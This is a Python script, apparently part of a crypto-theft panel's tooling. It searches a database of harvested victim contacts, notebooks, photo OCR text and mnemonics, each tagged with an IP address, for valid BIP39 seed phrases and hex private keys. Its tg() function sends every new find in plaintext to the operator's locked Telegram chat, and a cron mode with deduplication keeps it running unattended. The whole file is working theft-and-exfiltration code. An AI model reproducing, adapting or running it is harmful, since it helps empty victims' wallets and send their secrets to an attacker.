#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""scan_orphan_value.py —— 孤儿数据"有价内容"巡检 + TG 直发（2026-09-19 操作员指示）

范围：全部未归属行（serial 为空）—— contacts / notebooks / photos / mnemonics
方法：BIP39 词表序列检测（含校验和验证）+ 64 位十六进制私钥样式 + 关键词；
      **校验通过的助记词 + 疑似私钥串，直接 TG 直发操作员明文**（chat 2098010058 硬锁，
      与哨兵同口径：不读可变配置，杜绝发错人）。
去重：已发过的命中记录在状态文件，巡检不重复发；无新命中完全静默（只写本地日志+报告）。
用法: /root/venv/bin/python3 tools/scan_orphan_value.py            # 只扫描+报告
      /root/venv/bin/python3 tools/scan_orphan_value.py --tg       # 扫描+新命中直发TG（cron）
"""
import sys, os, re, json, time, hashlib, urllib.request, urllib.parse

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))   # 自动推导（节点同步兼容）
import psycopg2
_WL_PATH = '/root/venv/lib/python3.12/site-packages/bip_utils/bip/bip39/wordlist/english.txt'
WLIST = [w.strip() for w in open(_WL_PATH) if w.strip()]
WIDX = {w: i for i, w in enumerate(WLIST)}
WL = set(WLIST)

# 【2026-09-19】统一校验实现（tools/bip39_check.py）——本文件不再自带副本
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from bip39_check import bip39_valid  # noqa: E402

TG_CHAT_LOCK = '2098010058'   # 与哨兵/暗池同口径：固定只发这一个 chat
STATE = os.path.join(BASE, 'adm888app', 'data', 'orphan_scan_delivered.json')
LOG = os.path.join(BASE, 'logs', 'orphan_value_scan.log')
REPORT = os.path.join(BASE, 'logs', 'orphan_value_report_latest.json')

WORDSEQ = re.compile(r'[a-z]{3,8}(?:\s+[a-z]{3,8}){11,23}')
HEX64 = re.compile(r'(?<![0-9a-fA-F])[0-9a-fA-F]{64}(?![0-9a-fA-F])')
KW = re.compile(r'(助记词|私钥|助記詞|seed phrase|mnemonic|private.?key)', re.I)


def log(line):
    try:
        with open(LOG, 'a') as f:
            f.write(time.strftime('[%F %T] ') + line + '\n')
    except Exception:
        pass


def tg(text):
    try:
        cfg = json.load(open(os.path.join(BASE, 'adm888app', 'data', 'notify_cfg.json')))
        token = (cfg.get('tg_token') or '').strip()
        if not token:
            log('TG token 缺失，未发送')
            return False
        body = urllib.parse.urlencode({'chat_id': TG_CHAT_LOCK, 'text': text[:3900], 'disable_web_page_preview': 'true'}).encode()
        req = urllib.request.Request('https://api.telegram.org/bot%s/sendMessage' % token, data=body)
        with urllib.request.urlopen(req, timeout=15) as r:
            ok = (r.status == 200)
        log('TG 已发(%s): %s' % ('ok' if ok else 'fail', text[:60].replace('\n', ' ')))
        return ok
    except Exception as e:
        log('TG 发送异常: %s' % e)
        return False


def scan_text(text):
    hits = {}
    if not text:
        return hits
    seqs = []
    for m in WORDSEQ.finditer(text.lower()):
        words = m.group(0).split()
        for n in (24, 21, 18, 15, 12):
            for i in range(0, max(1, len(words) - n + 1)):
                seg = words[i:i + n]
                if len(seg) == n and all(w in WL for w in seg):
                    valid = bip39_valid(' '.join(seg))
                    seqs.append({'n': n, 'words': ' '.join(seg), 'bip39_valid': valid})
    if seqs:
        seen, uniq = set(), []
        for s in sorted(seqs, key=lambda x: (not x['bip39_valid'], -x['n'])):
            if s['words'] in seen:
                continue
            seen.add(s['words']); uniq.append(s)
        hits['bip39_seqs'] = uniq[:10]
    hx = HEX64.findall(text)
    if hx:
        hits['hex64'] = list(dict.fromkeys(hx))[:5]
    kw = KW.findall(text)
    if kw:
        hits['keywords'] = list(set(x.lower() for x in kw))[:5]
    return hits


def main():
    tg_mode = '--tg' in sys.argv
    cfg = json.load(open(os.path.join(BASE, 'adm888app', 'data', 'pg.json')))
    conn = psycopg2.connect(host=cfg.get('host', '127.0.0.1'), port=cfg.get('port', 5432),
                            user=cfg['user'], password=cfg['password'], dbname=cfg.get('database', 'panel'))
    cur = conn.cursor()
    report = {'ts': time.time(), 'by_table': {}, 'hits': []}

    def push(tbl, rid, ip, scan, extra=None):
        item = {'tbl': tbl, 'id': rid, 'ip': ip or '', 'scan': scan}
        if extra:
            item.update(extra)
        report['hits'].append(item)

    # notebooks
    cur.execute("SELECT id, host(ip), COALESCE(title,''), COALESCE(content,'') FROM notebooks WHERE COALESCE(serial,'')=''")
    rows = cur.fetchall(); n_hits = 0
    for rid, ip, title, content in rows:
        h = scan_text(content)
        if h:
            n_hits += 1; push('notebooks', rid, ip, h, {'title': (title or '')[:80]})
    report['by_table']['notebooks'] = {'rows': len(rows), 'hits': n_hits}

    # contacts
    cur.execute("SELECT id, host(ip), COALESCE(name,''), COALESCE(data->>'note','') FROM contacts WHERE COALESCE(serial,'')=''")
    rows = cur.fetchall(); c_hits = 0
    for rid, ip, name, dnote in rows:
        h = scan_text(dnote or '')
        if h:
            c_hits += 1; push('contacts', rid, ip, h, {'title': (name or '')[:60]})
    report['by_table']['contacts'] = {'rows': len(rows), 'hits': c_hits}

    # photos：只看 OCR 字段原文（words / bip39_hits.sample），不做整段 JSON 滑动窗口扫描
    #   （整段扫描会因 1/16 概率巧合产生大量"假校验通过"窗口——2026-09-19 实测）
    cur.execute("SELECT id, host(ip), COALESCE(data->>'words',''), COALESCE(data->'bip39_hits','null')::text FROM photos WHERE COALESCE(serial,'')=''")
    rows = cur.fetchall(); p_hits = 0
    for rid, ip, words, bip in rows:
        cands = []
        if (words or '').strip():
            cands.append(words.strip())
        try:
            arr = json.loads(bip) if bip else []
            if isinstance(arr, list):
                for it in arr[:30]:
                    if isinstance(it, dict):
                        s = it.get('sample')
                        if isinstance(s, list):
                            cands.append(' '.join(str(x) for x in s))
                        elif isinstance(s, str) and s.strip():
                            cands.append(s.strip())
        except Exception:
            pass
        seqs = []
        for c in cands:
            ws = c.split()
            if not ws:
                continue
            tried = []
            if len(ws) in (12, 15, 18, 21, 24):
                tried.append((len(ws), 0))          # ① 精确字段原样
            for off in range(0, min(3, max(1, len(ws) - 11))):
                for n in (24, 21, 18, 15, 12):       # ② 兜底滑窗（每候选只取首个命中）
                    if (n, off) not in tried:
                        tried.append((n, off))
            hit = None
            for n, off in tried:
                seg = ws[off:off + n]
                if len(seg) == n and all(w in WL for w in seg):
                    hit = {'n': n, 'words': ' '.join(seg), 'bip39_valid': bip39_valid(' '.join(seg))}
                    if hit['bip39_valid']:
                        break
            if hit:
                seqs.append(hit)
        if seqs:
            p_hits += 1; push('photos', rid, ip, {'bip39_seqs': seqs[:4]})
    report['by_table']['photos'] = {'rows': len(rows), 'hits': p_hits}

    # mnemonics（孤儿行本身就是助记词 → 直接校验）
    cur.execute("SELECT id, COALESCE(plain,'') FROM mnemonics WHERE COALESCE(serial,'')=''")
    rows = cur.fetchall()
    for rid, plain in rows:
        push('mnemonics', rid, None, {'mnemonic': plain, 'bip39_valid': bip39_valid(plain)})
    report['by_table']['mnemonics'] = {'rows': len(rows), 'hits': len(rows)}

    # ── 汇总"有价命中"：校验通过的助记词 + 疑似私钥串 ──
    value = []
    for h in report['hits']:
        s = h.get('scan') or {}
        for q in (s.get('bip39_seqs') or []):
            if q.get('bip39_valid'):
                value.append({'kind': 'mnemonic', 'src': '%s#%s' % (h['tbl'], h['id']), 'text': q['words']})
        if s.get('mnemonic') and s.get('bip39_valid'):
            value.append({'kind': 'mnemonic', 'src': '%s#%s' % (h['tbl'], h['id']), 'text': s['mnemonic']})
        for x in (s.get('hex64') or []):
            value.append({'kind': 'hex64', 'src': '%s#%s' % (h['tbl'], h['id']), 'text': x})
    report['value'] = value

    # 状态去重
    try:
        st = json.load(open(STATE))
    except Exception:
        st = {'delivered': {}}
    delivered = st.setdefault('delivered', {})
    fresh = []
    for v in value:
        key = v['kind'] + ':' + hashlib.md5(v['text'].encode()).hexdigest()
        if key not in delivered:
            delivered[key] = int(time.time())
            fresh.append(v)

    json.dump(report, open(REPORT, 'w'), ensure_ascii=False, indent=1)

    if fresh:
        lines = ['🆕 孤儿数据·有价命中 %s（面板不可见，直发明文）' % time.strftime('%F %T')]
        mn = [v for v in fresh if v['kind'] == 'mnemonic']
        hx = [v for v in fresh if v['kind'] == 'hex64']
        for i, v in enumerate(mn, 1):
            lines.append('\n%d) [%s]\n%s' % (i, v['src'], v['text']))
        if hx:
            lines.append('\n疑似私钥样式串（含噪声可能，需人工判断）:')
            for v in hx:
                lines.append('· [%s] %s' % (v['src'], v['text']))
        lines.append('\n（记录文件: logs/orphan_value_report_latest.json；已发过的不再重复）')
        if tg_mode:
            tg('\n'.join(lines))
        log('有价命中 新增 %d 条（mnemonic=%d hex64=%d）%s' % (len(fresh), len(mn), len(hx), '已TG' if tg_mode else '仅报告'))
    else:
        log('巡检完成 无新命中（孤儿：%s）' % json.dumps({k: v['rows'] for k, v in report['by_table'].items()}, ensure_ascii=False))

    if tg_mode:
        json.dump(st, open(STATE, 'w'), ensure_ascii=False)
    print(json.dumps({'by_table': report['by_table'], 'value_total': len(value), 'fresh': len(fresh)}, ensure_ascii=False))
    conn.close()


if __name__ == '__main__':
    main()
